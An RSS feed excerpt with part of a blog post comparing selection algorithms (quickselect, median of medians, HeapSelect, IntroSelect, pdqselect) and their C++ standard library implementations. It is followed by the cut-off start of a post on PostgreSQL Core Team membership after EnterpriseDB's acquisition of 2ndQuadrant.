<p><img src="https://s0.wp.com/latex.php?latex=C%28n%29+%5Cleq+%28n+-+1%29+%2B+%5Cmathrm%7Bavg%7D%28C%28n%2F2%29%2C+%5Cldots%2C+C%28n%29%29+%5Cleq+n+-+1+%2B+4%283n%2F4%29+%3C+4n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n)) \leq n - 1 + 4(3n/4) < 4n" title="C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n)) \leq n - 1 + 4(3n/4) < 4n"> </p>



<p>Bad news is that the worst case will still be <img src="https://s0.wp.com/latex.php?latex=O%28n%5E2%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n^2)" title="O(n^2)"> if we are unfortunate and always pick the biggest element as a pivot, thus partitioning .</p>



<p>In that sense that algorithm provides lots of pivot “strategies” that are used nowadays, for example, picking pivot as a <img src="https://s0.wp.com/latex.php?latex=n%2F2&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n/2" title="n/2"> element of the array or picking pivot from 3 random elements . Or do like <code>std::nth_element</code> from libcxx — choose the middle out out of <img src="https://s0.wp.com/latex.php?latex=A%5B0%5D%2C+A%5Bn%2F2%5D%2C+A%5Bn+-+1%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="A[0], A[n/2], A[n - 1]" title="A[0], A[n/2], A[n - 1]">.</p>



<p>I decided to visualize all algorithms I am going to talk about today, so quickselect with a median of 3 strategy on random input looks something like this:</p>



<figure><img data-attachment-id="579" data-permalink="https://danlark.org/nth-element-clang-2020-11-09_11-18-38/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nth-element-clang-2020-11-09_11.18.38" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif?w=1024" alt=""><figcaption>nth_element in libcxx, median of 3 strategies</figcaption></figure>



<p>And random pivot out of 3 elements works similar</p>



<figure><img data-attachment-id="581" data-permalink="https://danlark.org/median-of-3-random-2020-11-09_11-06-02/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="median-of-3-random-2020-11-09_11.06.02" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif?w=1024" alt=""><figcaption>Finding median in median of 3 random algorithm</figcaption></figure>



<p>For a strategy like <a href="https://github.com/llvm/llvm-project/blob/3ed89b51da38f081fedb57727076262abb81d149/libcxx/include/algorithm#L5159">libcxx</a> (C++ llvm standard library) does, there are quadratic counterexamples that are pretty easy to detect, such patterns also appear in real data. The counterexample looks like that:</p>



<figure><div>
<div id="gist106376435">
    <div>
      <div>
        

      </div>
      
    </div>
</div>

</div></figure>



<figure><img data-attachment-id="584" data-permalink="https://danlark.org/nth_element_clang_median_3_killer-2020-11-10_22-55-30/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nth_element_clang_median_3_killer-2020-11-10_22.55.30" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif?w=1024" alt=""><figcaption>std::nth_element in libcxx for Medianof3Killer</figcaption></figure>



<p>This is definitely quadratic. By the way, this is perfectly ok with the C++ standard wording as it says:</p>



<figure><img data-attachment-id="587" data-permalink="https://danlark.org/2020-11-10-230126_795x63_scrot/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png" data-orig-size="795,63" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020-11-10-230126_795x63_scrot" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=795" alt="" srcset="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png 795w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=150 150w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=300 300w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=768 768w" sizes="(max-width: 795px) 100vw, 795px"><figcaption><a href="https://eel.is/c++draft/alg.nth.element#5">https://eel.is/c++draft/alg.nth.element#5</a></figcaption></figure>



<h2>Median of Medians</h2>



<p>For a long time, computer scientists thought that it is impossible to find medians in worst-case linear time, however, Blum, Floyd, Pratt, Rivest, Tarjan came up with BFPRT algorithm or like sometimes it is called, median of medians algorithm.</p>



<p>Median of medians algorithm: Given array <img src="https://s0.wp.com/latex.php?latex=A&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="A" title="A"> of size <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> and integer <img src="https://s0.wp.com/latex.php?latex=k+%5Cleq+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k \leq n" title="k \leq n">,</p>



<ol><li>Group the array into <img src="https://s0.wp.com/latex.php?latex=n%2F5&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n/5" title="n/5"> groups of size 5 and find the median of each group. (For simplicity, we will ignore integrality issues.)</li><li>Recursively, find the true median of the medians. Call this <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p">.</li><li>Use <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p"> as a pivot to partition the array.</li><li>Recurse on the appropriate piece.</li></ol>



<p>When we find the median <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p"> of <img src="https://s0.wp.com/latex.php?latex=g+%3D+n%2F5&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="g = n/5" title="g = n/5"> groups, at least <img src="https://s0.wp.com/latex.php?latex=g%2F2&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="g/2" title="g/2"> of them have at least 3 out of 5 elements that are smaller or equal than <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p">, that said the biggest out of 2 partitioned chunks have size <img src="https://s0.wp.com/latex.php?latex=7n%2F10&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="7n/10" title="7n/10"> and we have the reccurence</p>



<p><img src="https://s0.wp.com/latex.php?latex=C%28n%29+%5Cleq+cn+%2B+C%28n%2F5%29+%2B+C%287n%2F10%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) \leq cn + C(n/5) + C(7n/10)" title="C(n) \leq cn + C(n/5) + C(7n/10)"></p>



<p>If we appropriately build the recurse tree we will see that</p>



<figure><img data-attachment-id="589" data-permalink="https://danlark.org/2020-11-10-232345_1330x458_scrot/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png" data-orig-size="1330,458" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020-11-10-232345_1330x458_scrot" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=1024" alt="" srcset="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=1024 1024w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=150 150w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=300 300w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=768 768w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png 1330w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This is the geometric series with <img src="https://s0.wp.com/latex.php?latex=cn%281+%2B+9%2F10+%2B+%289%2F10%29%5E2+%2B+%289%2F10%29%5E3+%2B+%5Cldots+...%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="cn(1 + 9/10 + (9/10)^2 + (9/10)^3 + \ldots ...)" title="cn(1 + 9/10 + (9/10)^2 + (9/10)^3 + \ldots ...)"> which gives us the result <img src="https://s0.wp.com/latex.php?latex=C%28n%29+%5Cleq+10+c+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) \leq 10 c n" title="C(n) \leq 10 c n">.</p>



<p>Actually, this constant 10 is really big. For example, if we look a bit closer, <img src="https://s0.wp.com/latex.php?latex=c&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="c" title="c"> is at least 1 because we need to partition the array, then finding median out of 5 elements cannot be done in less than 6 comparisons (can be proven by only brute-forcing) and in 6 comparisons it can be done in the following way</p>



<ol><li>Use three comparisons and shuffle around the numbers so that <img src="https://s0.wp.com/latex.php?latex=a%5B1%5D+%3C+a%5B2%5D%2C+a%5B4%5D+%3C+a%5B5%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[1] < a[2], a[4] < a[5]" title="a[1] < a[2], a[4] < a[5]">, and <img src="https://s0.wp.com/latex.php?latex=a%5B1%5D+%3C+a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[1] < a[4]" title="a[1] < a[4]">.</li><li>If <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D+%3E+a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3] > a[2]" title="a[3] > a[2]">, then the problem is fairly easy. If <img src="https://s0.wp.com/latex.php?latex=a%5B2%5D+%3C+a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[2] < a[4]" title="a[2] < a[4]">, the median value is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3]" title="a[3]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[4]" title="a[4]">. If not, the median value is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[2]" title="a[2]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B5%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[5]" title="a[5]">.</li><li>So <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D+%3C+a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3] < a[2]" title="a[3] < a[2]">. If <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D+%3E+a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3] > a[4]" title="a[3] > a[4]">, then the solution is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3]" title="a[3]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B5%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[5]" title="a[5]">. Otherwise, the solution is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[2]" title="a[2]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[4]" title="a[4]">.</li></ol>



<p>So that maximum <img src="https://s0.wp.com/latex.php?latex=c&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="c" title="c"> can be <img src="https://s0.wp.com/latex.php?latex=11%2F5&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="11/5" title="11/5"> and it gives us the upper bound <img src="https://s0.wp.com/latex.php?latex=22n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="22n" title="22n"> comparisons which looks like it can be achieved. Some other tricks can be done in place to achieve a bit lower constants like <img src="https://s0.wp.com/latex.php?latex=18n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="18n" title="18n"> (for example, sorting arrays of 5 and comparing less afterwards). In practice, the constant is really big and you can see it from the following demonstration which was even fastened because it took quite a few seconds:</p>



<figure><img data-attachment-id="593" data-permalink="https://danlark.org/median-of-medians-2020-11-09_11-04-33/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="median-of-medians-2020-11-09_11.04.33" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif?w=1024" alt=""><figcaption>Median of medians for random input</figcaption></figure>



<h2>HeapSelect</h2>



<p>Another approach to finding <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th element is to create a <a href="https://en.wikipedia.org/wiki/Heap_(data_structure)">heap</a> on an array of size <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> and push other <img src="https://s0.wp.com/latex.php?latex=n+-+k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n - k" title="n - k"> elements into this heap. C++ <code>std::partial_sort</code> works that way (with additional heap sorting of the first heap). It shows good results for very small <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> and random/ascending arrays, however starts to significantly degrade with growing <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> and becomes impractical. Best case <img src="https://s0.wp.com/latex.php?latex=O%28n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n)" title="O(n)">, worst <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log k)" title="O(n \log k)">, average <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log k)" title="O(n \log k)">.</p>



<figure><img data-attachment-id="596" data-permalink="https://danlark.org/partial_sort-2020-11-09_12-28-40/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="partial_sort-2020-11-09_12.28.40" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif?w=1024" alt=""><figcaption>std::partial_sort, two stages, first HeapSelect then heap sort of the first half, accelerated for speed</figcaption></figure>



<h2>IntroSelect</h2>



<p>As the previous algorithm is not very much practical and QuickSelect is really good on average, in 1997 <a href="http://www.cs.rpi.edu/~musser/gp/introsort.ps">“Introspective Sorting and Selection Algorithms”</a>  from David Musser came out with a sorting algorithm called “IntroSelect”. </p>



<p>IntroSelect works by optimistically starting out with QuickSelect and only switching to MedianOfMedians if it recurses too many times without making sufficient progress. Simply limiting the recursion to constant depth is not good enough, since this would make the algorithm switch on all sufficiently large arrays. Musser discusses a couple of simple approaches:</p>







<p>This algorithm came into <a href="https://github.com/gcc-mirror/gcc/blob/e0af865ab9d9d5b6b3ac7fdde26cf9bbf635b6b4/libstdc%2B%2B-v3/include/bits/stl_algo.h#L4748">libstdcxx</a> and guess which strategy was chosen? Correct, none of them. Instead, they try <img src="https://s0.wp.com/latex.php?latex=2%5Clog+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="2\log n" title="2\log n"> QuickSelect steps and if not successful, fallback to HeapSelect algorithm. So, worst case <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log n)" title="O(n \log n)">, average <img src="https://s0.wp.com/latex.php?latex=O%28n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n)" title="O(n)"></p>



<figure><img data-attachment-id="598" data-permalink="https://danlark.org/nth-element-gcc-2020-11-09_11-06-37/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nth-element-gcc-2020-11-09_11.06.37" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif?w=1024" alt=""><figcaption>std::nth_element in libstdcxx, “IntroSelect”</figcaption></figure>



<h2>PDQSelect</h2>



<p>Now that most of the known algorithms come to an end 😈, we can start looking into something special and extraordinary. And the first one to look at is pdqselect which comes pretty straightforward from <a href="https://github.com/orlp/pdqsort">pdqsort</a>, the algorithm is basically QuickSelect but with some interesting ideas on how to choose an appropriate pivot:</p>



<ol><li>If there are <img src="https://s0.wp.com/latex.php?latex=n+%3C+24&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n < 24" title="n < 24"> elements, use <a href="https://en.wikipedia.org/wiki/Insertion_sort">insertion sort</a> to partition or even sort them. As insertion sort is really fast for a small amount of elements, it is reasonable</li><li>If it is more, choose <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p"> — pivot:<ol><li>If there are less or equal than 128 elements, choose pseudomedian (or “ninther”, or median of medians which are all them same) of the following 3 groups:<ol><li>begin, mid, end</li><li>begin + 1, mid – 1, end – 1</li><li>begin + 2, mid + 1, end – 2</li></ol></li><li>If there are more than 128 elements, choose median of 3 from begin, mid, end</li></ol></li><li>Partition the array by the chosen pivot with avoiding <a href="https://www.researchgate.net/publication/301614727_BlockQuicksort_How_Branch_Mispredictions_don't_affect_Quicksort">branches</a>:<ol><li>The partition is called bad if it splits less than <img src="https://s0.wp.com/latex.php?latex=1%2F8n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="1/8n" title="1/8n"> elements</li><li>If the total number of bad partitions exceeds <img src="https://s0.wp.com/latex.php?latex=%5Clog+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="\log n" title="\log n">, use <code>std::nth_element</code> or any other fallback algorithm and return</li><li>Otherwise, try to defeat some patterns in the partition by (sizes are l_size and r_size respectively):<ol><li>Swapping begin, begin + l_size / 4</li><li>Swapping p – 1 and p – l_size / 4</li><li>And if the number of elements is more than 128<ol><li>begin + 1, begin + l_size / 4 + 1</li><li>begin + 2, begin + l_size / 4 + 2</li><li>p – 2, p – l_size / 4 + 1</li><li>p – 3, p – l_size / 4 + 2</li></ol></li><li>Do the same with the right partition</li></ol></li></ol></li><li>Choose the right partition part and repeat like in QuickSelect</li></ol>



<figure><img data-attachment-id="605" data-permalink="https://danlark.org/pdqselect-2020-11-09_11-03-23/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pdqselect-2020-11-09_11.03.23" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif?w=1024" alt=""><figcaption>pdqselect on random input</figcaption></figure>



<h2>Media…</h2></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/">https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/</a></em></p>]]>
            </description>
            <link>https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059942</guid>
            <pubDate>Wed, 11 Nov 2020 16:46:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is It Time to Modernize the PostgreSQL Core Team?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059852">thread link</a>) | @ahachete
<br/>
November 11, 2020 | https://postgresql.fund/blog/is-it-time-to-modernize-postgresql-core/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/is-it-time-to-modernize-postgresql-core/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    
<p>The PostgreSQL Community is large, diverse and global. There are users, enthusiasts, developers, contributors, advocates and commercial entities from around the world. All of them working in a loosely collaborative fashion to grow and make PostgreSQL succeed.</p>
<p>The Postgres Core Team is considered to be the steering committee for the Community. The definition of the group responsibilities can be <a href="https://www.postgresql.org/developer/core/">found here</a>. The core team members are listed on the <a href="https://www.postgresql.org/community/contributors/">Contributor Profiles</a> page.</p>
<p>On September 30th EnterpriseDB acquired 2ndQuadrant. At the time of the acquisition there were five members in Core; two of them were EnterpriseDB employees and another one a 2ndQuadrant employee. This meant that 60% of the Core members would be employed by EnterpriseDB. On October 20th, in an effort to diffuse concerns about a single commercial entity having majority control, the <a href="https://www.postgresql.org/about/news/statement-from-the-postgresql-core-team-on-the-edb-acquisition-of-2ndquadrant-2094/">Core Team announced</a> that this is an issue that they would be addressing:</p>
<p>“<em>There has long been an unwritten rule that there should be no more than 50% of the membership of the Core Team working for the same company</em>”</p>
<p>This rule was enacted back in the days of the <a href="https://www.postgresql.org/message-id/39181CCD.99531ADA@greatbridge.com">Great Bridge</a>. Core addressed the unwritten rule by appointing on November 2nd <a href="https://www.postgresql.org/about/news/new-postgresql-core-team-members-2103/">two new members: Andres Freund and Jonathan Katz</a>. This change in Core reduced the proportion of EnterpriseDB members to three out of seven. <strong>Fundación PostgreSQL</strong> would like to extend a very warm welcome to Andres and Jonathan. They are both well known and long time community contributors.</p>
<p>The addition of the new members allowed Core to be compliant with the 50% rule. However: was this organizational change the best choice? Was it the only change that could have been implemented? Could we have looked at the culture of our global community and used this opportunity to strengthen our ties?</p>
<p>Here are some facts about Core’s structure and membership:</p>
<ul>
<li><strong>Company influence</strong>:
<ul>
<li>Core has switched from having 40% of its members from a single company to now having 43% from a single company and 71% from two companies.</li>
<li>100% of the members are from only 4 companies.</li>
</ul>
</li>
<li><strong>Diversity</strong>:
<ul>
